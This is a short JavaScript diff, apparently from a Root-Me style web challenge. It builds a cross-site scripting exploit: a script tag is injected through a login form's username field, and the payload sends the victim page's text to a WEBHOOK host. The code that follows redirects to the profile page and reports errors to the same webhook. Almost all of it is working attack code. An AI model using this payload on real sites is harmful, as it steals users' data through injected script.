@@ -23,12 +23,13 @@ try {
   const profile = window.open(PROFILE, "rootme");
 
   const payload = `
+window.open("", "rootme");
 window.location = "${WEBHOOK}?" + rootme.document.body.innerText;
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  window.open("", "rootme");
+  setTimeout(() => (window.location = PROFILE), 5000);
 } catch (error) {
   post(WEBHOOK, `Error ${id}: ${error}`);
 }
